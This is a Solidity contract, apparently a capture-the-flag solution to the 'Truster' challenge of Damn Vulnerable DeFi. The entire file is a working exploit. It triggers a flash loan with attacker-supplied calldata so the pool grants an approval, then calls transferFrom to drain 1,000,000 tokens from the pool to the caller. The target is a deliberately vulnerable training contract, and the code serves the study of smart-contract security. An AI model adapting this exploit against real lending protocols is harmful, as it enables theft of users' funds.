import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackerTruster {
    TrusterLenderPool public trust; // Make the TrusterLenderPool contract public
    IERC20 public immutable damnValuableToken;

    constructor(address _trust, address tokenAddress) {
        trust = TrusterLenderPool(_trust);
        damnValuableToken = IERC20(tokenAddress);
    }

    function exploit(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        trust.flashLoan(borrowAmount, borrower, target, data);
        // after approving the flash loan, the exploit function will be called
        damnValuableToken.transferFrom(
            address(trust),
            msg.sender,
            1000000 ether
        );
    }
}
